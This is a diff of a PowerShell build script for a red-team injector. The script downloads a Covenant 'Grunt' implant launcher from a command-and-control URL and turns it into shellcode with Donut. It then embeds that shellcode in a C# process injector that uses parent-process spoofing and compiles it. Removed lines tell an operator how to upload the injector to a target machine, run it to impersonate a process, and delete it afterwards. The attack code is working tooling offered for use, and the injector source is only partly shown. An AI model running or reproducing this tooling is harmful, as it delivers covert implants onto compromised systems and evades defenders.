@@ -14,27 +14,32 @@ param(
 
     [Parameter(Mandatory = $false)]
     [string]
+    $DotNetFrameworkVersion = "4.0",
+
+    [Parameter(Mandatory = $false)]
+    [string]
     $DonutPath = "donut"
 )
 
 # Variables
-$wd = (Get-Location).Path
-$LauncherExePath = "GruntLauncher.exe"
-$InjectorShellcodePath = "GruntInjector.bin"
-$GruntInjectorSourcePath = "GruntInjector.cs"
-$cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+$LauncherAssemblyPath = "GruntLauncher.exe"
+$LauncherShellcodePath = "GruntLauncher.bin"
+$InjectorAssemblyPath = "GruntInjector.exe"
+If (-Not ($DotNetFrameworkVersion -In @("3.5", "4.0"))) {
+    throw "[!] Invalid .NET Framework Version: should be 3.5 or 4.0"
+}
 
 # Download binary Grunt launcher from Covenant server
-$launcherBinary = (New-Object Net.WebClient).DownloadString($LauncherURL)
+$LauncherAssembly = (New-Object Net.WebClient).DownloadString($LauncherURL)
 
 # Write to disk
-Set-Content -Path $launcherExePath -Value $launcherBinary
+Set-Content -Path $LauncherAssemblyPath -Value $LauncherAssembly
 
 # Use Donut to translate the binary launcher on disk into shellcode
-Invoke-Expression -Command "& '$DonutPath' $LauncherExePath -o $InjectorShellcodePath" | Out-Null
+Invoke-Expression -Command "& '$DonutPath' $LauncherAssemblyPath -o $LauncherShellcodePath" | Out-Null
 
 # Base 64 encode shellcode
-$base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$InjectorShellcodePath")))
+$Base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$LauncherShellcodePath")))
 
 # Insert base 64 encoded shellcode into GruntInjector.cs
 $GruntInjectorSource = @"
@@ -53,7 +58,7 @@ namespace GruntInjection
         public const int ProcThreadAttributeParentProcess = 0x00020000;
 
         // Hardcoded Grunt Stage
-        public static byte[] gruntStager = Convert.FromBase64String("$base64Shellcode");
+        public static byte[] gruntStager = Convert.FromBase64String("$Base64Shellcode");
 
         static void Main(string[] args)
         {
@@ -227,28 +232,27 @@ namespace GruntInjection
 }
 "@
 
-# Write injector source code to disk
-Set-Content -Path $GruntInjectorSourcePath -Value $GruntInjectorSource
+# Compile injector source code
+$CompilerOptions = New-Object "System.Collections.Generic.Dictionary``2[System.String, System.String]"
+$CompilerOptions.Add("CompilerVersion", "v$DotNetFrameworkVersion")
+$Provider = New-Object Microsoft.CSharp.CSharpCodeProvider $CompilerOptions
+$CompilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
+$CompilerParameters.ReferencedAssemblies.Add("System.dll")
+$CompilerParameters.GenerateExecutable = $true 
+$CompilerParameters.CompilerOptions = "/optimize"
+$CompilerParameters.OutputAssembly = $InjectorAssemblyPath
+$Result = $Provider.CompileAssemblyFromSource($CompilerParameters, $GruntInjectorSource)
+If ($Result.Errors) {
+    ForEach ($Error in $Result.Errors) {
+        Write-Host "[!] $Error in compilation: $Error"
+    }
+}
+Else {
+    Write-Host "[*] Path to injector: $($Result.PathToAssembly)"
+}
 
-# Compile injector source code file with CSC V4
-Invoke-Expression -Command "$CscPath $GruntInjectorSourcePath" | Out-Null
-
-# Clean up launcher binary, shellcode, and injector source code
-Remove-Item -Path $LauncherExePath
-Remove-Item -Path $InjectorShellcodePath
-Remove-Item -Path $GruntInjectorSourcePath
-
-# Notify the operator 
-Write-Host "[*] GruntInjector.exe generated"
-Write-Host "`n[**] UPLOAD"
-Write-Host "[**] Covenant -> Grunts -> <choose grunt> -> Tasks -> Upload"
-Write-Host "[**] FilePath: <path to upload file to on target machine"
-Write-Host "[**] FileContents: <browse to file to upload>"
-Write-Host "`n[***] INJECT"
-Write-Host "[***] Covenant -> Grunts -> <choose grunt> -> Interact"
-Write-Host "[***] shell <path to injector on target> <full path of exe to impersonate> <PPID>"
-Write-Host "`n[****] CLEAN UP"
-Write-Host "[****] Covenant -> Grunts -> <choose grunt> -> Interact"
-Write-Host "[****] shell del <path to injector on target>"
-
+# Clean up launcher binary & shellcode
+<#
+Remove-Item -Path $LauncherAssemblyPath
+Remove-Item -Path $LauncherShellcodePath
 #>
